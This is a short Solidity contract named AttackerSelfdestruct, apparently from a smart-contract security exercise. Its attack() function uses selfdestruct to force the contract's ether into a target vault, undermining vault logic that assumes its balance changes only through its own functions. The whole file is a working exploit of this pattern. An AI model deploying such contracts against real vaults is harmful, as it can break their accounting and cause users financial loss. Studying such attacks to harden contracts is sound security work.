// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.11;

interface IVault2 {
    
}

contract AttackerSelfdestruct {
    IVault2 public immutable vault2;

    constructor(address _vault2) payable{
        vault2 = IVault2(_vault2);
    }

    function attack() public payable {
        address payable addr = payable(address(vault2));
        selfdestruct(addr);
    }
}